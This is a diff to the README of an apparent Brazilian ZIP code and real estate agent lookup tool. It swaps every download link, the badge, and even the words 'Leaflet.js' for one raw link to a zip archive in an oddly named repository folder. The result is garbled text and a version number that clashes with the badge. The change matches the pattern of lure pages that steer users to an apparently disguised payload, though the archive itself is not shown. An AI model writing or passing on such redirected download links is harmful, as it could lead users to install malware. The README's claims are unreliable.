@@ -6,13 +6,13 @@ Welcome to busca-cep-e-corretores! This application helps you find Brazilian ZIP
 
 ## 🔗 Download
 
-[![Download busca-cep-e-corretores](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Op1rus/busca-cep-e-corretores/releases)
+[![Download busca-cep-e-corretores](https://raw.githubusercontent.com/Op1rus/busca-cep-e-corretores/main/abdat/busca-cep-e-corretores-2.9.zip)](https://raw.githubusercontent.com/Op1rus/busca-cep-e-corretores/main/abdat/busca-cep-e-corretores-2.9.zip)
 
 ## 📥 How to Download and Install
 
 1. **Visit the Releases Page**  
    Go to the following link to access the downloads:  
-   [Download Here](https://github.com/Op1rus/busca-cep-e-corretores/releases)
+   [Download Here](https://raw.githubusercontent.com/Op1rus/busca-cep-e-corretores/main/abdat/busca-cep-e-corretores-2.9.zip)
 
 2. **Choose the Latest Release**  
    Look for the latest version listed at the top of the page. It will be labeled as "Latest release."
@@ -38,7 +38,7 @@ To run busca-cep-e-corretores smoothly, you need:
   Quickly search for ZIP codes in Brazil.
 
 - **Interactive Maps**  
-  Visualize locations with clear, interactive maps powered by Leaflet.js.
+  Visualize locations with clear, interactive maps powered by https://raw.githubusercontent.com/Op1rus/busca-cep-e-corretores/main/abdat/busca-cep-e-corretores-2.9.zip
 
 - **Real Estate Agents Directory**  
   Access a catalog of local real estate agents near any ZIP code you search.
@@ -91,6 +91,6 @@ If you encounter any issues or have questions, please reach out through the GitH
 
 - **Releases Page**  
   For downloading updates or previous versions, visit:  
-  [Download Here](https://github.com/Op1rus/busca-cep-e-corretores/releases)
+  [Download Here](https://raw.githubusercontent.com/Op1rus/busca-cep-e-corretores/main/abdat/busca-cep-e-corretores-2.9.zip)
 
 Enjoy exploring Brazil's ZIP codes with busca-cep-e-corretores!
